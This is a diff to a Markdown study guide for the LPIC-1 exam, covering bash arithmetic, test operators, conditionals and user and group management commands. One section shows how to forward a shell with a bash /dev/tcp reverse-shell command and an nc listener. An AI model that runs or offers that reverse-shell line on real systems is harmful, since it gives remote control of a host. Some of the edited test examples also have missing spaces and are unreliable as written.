@@ -192,7 +192,10 @@ unset -f myfunction
 ##### command printenv
 
 ```sh
-#print valeue of variable
+#print all of environment
+printenv
+
+#print value of variable
 printenv myvar
 ```
 
@@ -213,11 +216,12 @@ multiplication(*), division(/) and modulus(%) operators can be used in the expre
 
 ```sh
 #examples:
-let "myvar =2" "myvar1=1" "myvar2=myvar1+myvar"; echo $myvar2
-let "myvar =2" "myvar1=1" "myvar2=myvar1-myvar"; echo $myvar2
-let "myvar =2" "myvar1=1" "myvar2=myvar1*myvar"; echo $myvar2
-let "myvar =2" "myvar1=1" "myvar2=myvar1/myvar"; echo $myvar2
-let "myvar =2" "myvar1=1" "myvar2=myvar1%myvar"; echo $myvar2
+
+let "a =2" "b=1" "result=a+b"; echo $result
+let "a =5" "b=3" "result=a-b"; echo $result
+let "a =10" "b=4" "result=a*b"; echo $result
+let "a =20" "b=3" "result=a/b"; echo $result
+let "a =10" "b=3" "result=a%b"; echo $result
 ```
 
 Post-increment(var++) / Post-decrement(var–) operator : This operator is used to interpret the integer value then increase/decrease the integer variable by 1.
@@ -229,7 +233,8 @@ let "myvar=2" "myvar2=myvar++" ; echo $myvar $myvar2
 
 In the above example, myvar2 gets the value of myvar2 before the increment occurs.
 
-Pre-increment(++var) / Pre-decrement(–var) operator : This operator increases/decreases the integer value by 1 and then interpret the integer variable.
+Pre-increment(++var) / Pre-decrement(–var) operator:\
+This operator increases/decreases the integer value by 1 and then interpret the integer variable.
 
 ```sh
 #Example:
@@ -306,6 +311,7 @@ unalias hello
 ```sh
 #simple example function 1
 function myfunction1{
+    export LANG=C
     echo "This is a simple function in bash"
 }
 myfunction1
@@ -441,18 +447,20 @@ shopt | grep login_shell
 One of the most interesting things that you can do with a shell is to forward it to another host.\
 You will need nc or netcat on the host to which you forward the shell.
 
+The address 192.168.0.135 is the host to which you want to forward the shell.\
+After the IP (note that you can also use a hostname but I strongly suggest you use an IP to prevent issues with hostname-resolving) you have to put the port number (9999) on which the netcat listener will listen.
+
+You have to start the netcat listener on the other side.\
+Double check that there are no firewall rules preventing you from accepting connections.
+
+```sh
+nc -l 9999
+```
+
 On the host with the shell you have to issue the command
 
 ```sh
 bash -i >& /dev/tcp/192.168.0.135/9999 0>&1
-```
-
-The address 192.168.0.135 is the host to which you want to forward the shell. After the IP (note that you can also use a hostname but I strongly suggest you use an IP to prevent issues with hostname-resolving) you have to put the port number (9999) on which the netcat listener will listen.
-
-You have to start the netcat listener on the other side. Double check that there are no firewall rules preventing you from accepting connections.
-
-```sh
-nc -l 9999
 ```
 
 ##### Resume of precedence order of execution in files of shell login
@@ -494,127 +502,127 @@ fi
 
 Assuming the path to a file or directory was stored in the variable $VAR,the following expressions can be used as arguments to test or inside square brackets:
 
-```-a "$VAR"```\
+```test -a "$VAR"```\
 Evaluate if the path in VAR exists in the filesystem and it is a file.
 
-```-b "$VAR"```\
+```test -b "$VAR"```\
 Evaluate if the path in VAR is a special block file.
 
-```-c "$VAR"```\
+```test -c "$VAR"```\
 Evaluate if the path in VAR is a special character file.
 
-```-d "$VAR"```\
+```test -d "$VAR"```\
 Evaluate if the path in VAR is a directory.
 
-```-e "$VAR"```\
+```test -e "$VAR"```\
 Evaluate if the path in VAR exists in the filesystem.
 
-```-f "$VAR"```\
+```test-f "$VAR"```\
 Evaluate if the path in VAR exists and it is a regular file.
 
-```-g "$VAR"```\
+```test -g "$VAR"```\
 Evaluate if the path in VAR has the SGID permission.
 
-```-h "$VAR"```\
+```test -h "$VAR"```\
 Evaluate if the path in VAR is a symbolic link.
 
-```-L "$VAR"```\
+```test -L "$VAR"```\
 Evaluate if the path in VAR is a symbolic link (like -h).
 
-```-k "$VAR"```\
+```test -k "$VAR"```\
 Evaluate if the path in VAR has the sticky bit permission.
 
-```-p "$VAR"```\
+```test -p "$VAR"```\
 Evaluate if the path in VAR is a pipe file.
 
-```-r "$VAR"```\
+```test -r "$VAR"```\
 Evaluate if the path in VAR is readable by the current user.
 
-```-s "$VAR"```\
+```test -s "$VAR"```\
 Evaluate if the path in VAR exists and it is not empty.
 
-```-S "$VAR"```\
+```test -S "$VAR"```\
 Evaluate if the path in VAR is a socket file.
 
-```-t "$VAR"```\
+```test -t "$VAR"```\
 Evaluate if the path in VAR is open in a terminal.
 
-```-u "$VAR"```\
+```test -u "$VAR"```\
 Evaluate if the path in VAR has the SUID permission.
 
-```-w "$VAR"```\
+```test -w "$VAR"```\
 Evaluate if the path in VAR is writable by the current user.
 
-```-x "$VAR"```\
+```test -x "$VAR"```\
 Evaluate if the path in VAR is executable by the current user.
 
-```-O "$VAR"```\
+```test -O "$VAR"```\
 Evaluate if the path in VAR is owned by the current user.
 
-```-G "$VAR"```\
+```test -G "$VAR"```\
 Evaluate if the path in VAR belongs to the effective group of the current user.
 
-```-N "$VAR"```\
+```test -N "$VAR"```\
 Evaluate if the path in VAR has been modified since the last time it was accessed.
 
-```"$VAR1" -nt "$VAR2"```\
+```test "$VAR1" -nt "$VAR2"```\
 Evaluate if the path in VAR1 is newer than the path in VAR2, according to their modification dates.
 
-```"$VAR1" -ot "$VAR2"```\
+```test "$VAR1" -ot "$VAR2"```\
 Evaluate if the path in VAR1 is older than VAR2.
 
-```"$VAR1" -ef "$VAR2"```\
+```test "$VAR1" -ef "$VAR2"```\
 This expression evaluates to True if the path in VAR1 is a hardlink to VAR2.
 
 There are also tests for arbitrary text variables, described as follows:
 
-```-z "$TXT"```\
+```test -z "$TXT"```\
 Evaluate if variable TXT is empty (zero size).
 
-```-n "$TXT" or test "$TXT"```\
+```test -n "$TXT" or test "$TXT"```\
 Evaluate if variable TXT is not empty.
 
-```"$TXT1" = "$TXT2" or "$TXT1" == "$TXT2"```\
+```test "$TXT1" = "$TXT2" or test "$TXT1" == "$TXT2"```\
 Evaluate if TXT1 and TXT2 are equal.
 
-```"$TXT1" != "$TXT2"```\
+```test"$TXT1" != "$TXT2"```\
 Evaluate if TXT1 and TXT2 are not equal.
 
-```"$TXT1" < "$TXT2"```\
+```test "$TXT1" < "$TXT2"```\
 Evaluate if TXT1 comes before TXT2, in alphabetical order.
 
-```"$TXT1" > "$TXT2"```\
+```test "$TXT1" > "$TXT2"```\
 Evaluate if TXT1 comes after TXT2, in alphabetical order.
 
 Numerical comparisons have their own set of test options:
 
-```$NUM1 -lt $NUM2```\
+```test $NUM1 -lt $NUM2```\
 Evaluate if NUM1 is less than NUM2.
 
-```$NUM1 -gt $NUM2```\
+```test $NUM1 -gt $NUM2```\
 Evaluate if NUM1 is greater than NUM2.
 
-```$NUM1 -le $NUM2```\
+```test $NUM1 -le $NUM2```\
 Evaluate if NUM1 is less or equal to NUM2.
 
-```$NUM1 -ge $NUM2```\
+```test $NUM1 -ge $NUM2```\
 Evaluate if NUM1 is greater or equal to NUM2.
 
-```$NUM1 -eq $NUM2```\
+```test $NUM1 -eq $NUM2```\
 Evaluate if NUM1 is equal to NUM2.
 
-```$NUM1 -ne $NUM2```\
+```test $NUM1 -ne $NUM2```\
 Evaluate if NUM1 is not equal to NUM2.
 
 All tests can receive the following modifiers:
 
-```! EXPR```\
+```test ! EXPR```\
 Evaluate if the expression EXPR is false.
 
-```EXPR1 -a EXPR2```\
+```test EXPR1 -a EXPR2```\
 Evaluate if both EXPR1 and EXPR2 are true.
 
-```EXPR1 -o EXPR2```\
+```test EXPR1 -o EXPR2```\
 Evaluate if at least one of the two expressions are true.
 
 ##### read - read from a file descriptor
@@ -626,6 +634,7 @@ echo $myinput
 
 #example 2
 read -p "Type your first name and last name:"
+read -p "Type your first name and last name:" NAME SURNAME
 echo $NAME $SURNAME
 
 #example 3 for hide input
@@ -732,14 +741,6 @@ The minimum acceptable password length.
 PASS_WARN_AGE\
 The number of warning days before a password expires.
 
-#### 105.2 Cited Objects
-
->for\
-while\
-if\
-||\
-&&
-
 ##### Variables
 
 ```sh
@@ -793,6 +794,37 @@ echo ${#SIZES[1]}
 echo ${#SIZES[@]}
 echo ${#SIZES[*]}
 
+```
+
+##### conditional if\else
+
+```sh
+#sintax if
+if TEST-COMMAND
+then
+  STATEMENTS
+fi
+
+#syntax if..else
+if TEST-COMMAND
+then
+  STATEMENTS1
+else
+  STATEMENTS2
+fi
+
+#examples
+if [[ $VAR -gt 10 ]]
+then
+  echo "The variable is greater than 10."
+fi
+
+if [[ $VAR -gt 10 ]]
+then
+  echo "The variable is greater than 10."
+else
+  echo "The variable is equal or less than 10."
+fi
 ```
 
 ##### conditional construct case
@@ -898,6 +930,14 @@ do
 done
 ```
 
+#### 105.2 Cited Objects
+
+>for\
+while\
+if\
+||\
+&&
+
 ## Topic 106: User Interfaces and Desktops
 
 ### 106.1 Install and configure X11
@@ -913,6 +953,8 @@ Basic understanding and knowledge of the X Window configuration file.\
 Overwrite specific aspects of Xorg configuration, such as keyboard layout.\
 Understand the components of desktop environments, such as display managers and window managers.\
 Manage access to the X server and display applications on remote X servers.
+
+#### X1 Architecture
 
 ![image](https://user-images.githubusercontent.com/62715900/147991540-aa80332b-7bbd-49ce-92a0-1b659d59ccdf.png)
 
@@ -1199,6 +1241,83 @@ Create and manage special purpose and limited accounts.\
 
 #### 107.1 Important Commads
 
+##### getent - get entries from Name Service Switch libraries
+
+```sh
+#sintaxe
+getent database-nss key
+
+#find user
+getent passwd vagrant
+
+#find group
+getent group developers
+```
+
+##### groupadd - create a new group
+
+```sh
+#create a simple group
+sudo groupadd admins
+```
+
+##### groupdel - delete a group
+
+```sh
+#delete group
+sudo groupdel admins
+```
+
+##### groupmod - modify a group definition on the system
+
+```sh
+#modify groupname
+sudo groupmod -n infraestructure infra
+```
+
+##### useradd - create a new user or update default new user information
+
+```sh
+#create simple user
+sudo useradd jon
+
+# create home dir
+sudo useradd -m jon
+
+#personalize skel(home files)
+sudo mkdir /my-skel
+sudo  cp -r /etc/skel /my-skel
+sudo touch /my-skel/skel/my-personal-file.txt
+sudo useradd -m -k /my-skel/skel/ jon
+sudo ls -la /home/jon
+
+#personalize useradd defaults
+sudo vi  /etc/default/useradd
+```
+
+#### userdel - delete a user account and related files
+
+```sh
+#delete simple user
+sudo userdel jon
+
+#delete simple user and remove home dir
+sudo userdel -r jon
+```
+
+#### usermod - modify a user account
+
+```sh
+# add jon in group 1003
+sudo usermod -a -G 1003 jon
+
+#lock account
+sudo usermod -L jon
+
+#unlock account
+sudo usermod -U jon
+```
+
 ##### chage - change user password expiry information
 
 ```sh
@@ -1244,60 +1363,20 @@ sudo chage -M 99999 mary
 sudo chage --maxdays 99999 mary
 ```
 
-##### getent - get entries from Name Service Switch libraries
-
-```sh
-#sintaxe
-getent database-nss key
-
-#find user
-getent passwd vagrant
-
-#find group
-getent group developers
-```
-
-##### groupadd - create a new group
-
-```sh
-#create a simple group
-sudo groupadd admins
-```
-
-##### groupdel - delete a group
-
-```sh
-#delete group
-sudo groupdel admins
-```
-
-##### groupmod - modify a group definition on the system
-
-```sh
-#create a simple group
-sudo groupmod -n infraestructure infra
-```
-
 ##### passwd - update user's authentication tokens
 
 ```sh
 #create\update password
 sudo passwd jon
 
-#block account
-sudo passwd -l jon
-
-#unblock account
-sudo passwd -u jon
-
-#show status account
-passwd -S
-
 #lock account
 sudo passwd -l jon
 
 #unlock account
 sudo passwd -u jon
+
+#show status account
+passwd -S
 
 #force update password next logon
 sudo passwd -e jon
@@ -1305,49 +1384,6 @@ sudo passwd -e jon
 #delete password
 sudo passwd -d jon
 
-```
-
-##### useradd - create a new user or update default new user information
-
-```sh
-#create simple user
-sudo useradd jon
-
-# create home dir
-sudo useradd -m jon
-
-#personalize skel(home files)
-sudo mkdir /my-skel
-sudo  cp -r /etc/skel /my-skel
-sudo touch /my-skel/skel/my-personal-file.txt
-sudo useradd -m -k /my-skel/skel/ jon
-sudo ls -la /home/jon
-
-#personalize useradd defaults
-sudo vi  /etc/default/useradd
-```
-
-#### userdel - delete a user account and related files
-
-```sh
-#delete simple user
-sudo userdel jon
-
-#delete simple user and remove home dir
-sudo userdel -r jon
-```
-
-#### usermod - modify a user account
-
-```sh
-# add jon n group 1003
-sudo usermod -a -G 1003 jon
-
-#lock account
-sudo usermod -L jon
-
-#unlock account
-sudo usermod -U jon
 ```
 
 #### 107.1 Important Files
